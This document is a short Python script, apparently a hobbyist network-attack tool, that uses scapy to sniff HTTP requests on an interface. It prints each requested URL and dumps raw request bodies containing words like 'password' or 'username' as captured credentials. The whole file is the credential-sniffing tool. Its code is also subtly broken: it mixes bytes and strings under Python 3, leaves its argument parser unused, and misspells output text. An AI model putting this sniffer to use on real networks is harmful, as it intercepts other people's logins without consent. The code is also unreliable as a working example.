
#!/usr/bin/python3

from scapy.all import *

from scapy.layers.http import HTTPRequest # import HTTP packet
 
import scapy.all as scapy

from scapy.layers import http
 
# Put the interface of loopback interface.

 # use ifconfig command and find interface which has "inet 127.0.0.1"

interfaces = ['lo']
 
def get_arguments():

     parser = argparse.ArgumentParser()

     parser.add_argument("-i", "--interface", dest="interface",

                         help="Interface name")

     options = parser.parse_args()

     return options
 
 
def sniff_packet(interface):

     scapy.sniff(iface=interface, store=False, prn=process_packets)
 
 
def get_url(packet):

     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 
def get_credentials(packet):

     if packet.haslayer(scapy.Raw):

         load = packet[scapy.Raw].load

         keywords = ["login", "password", "username", "user", "pass"]

         for keyword in keywords:

             if keyword in load: 

                 return load
 
 
def process_packets(packet):

     if packet.haslayer(http.HTTPRequest):

         url = get_url(packet)

         print("[+] Http Request >> " + url.decode('utf-8'))

         credentials = get_credentials(packet)

         if credentials: 

             print("[+] Possible username/passowrd " + credentials + "\n\n")

sniff_packet(interfaces)
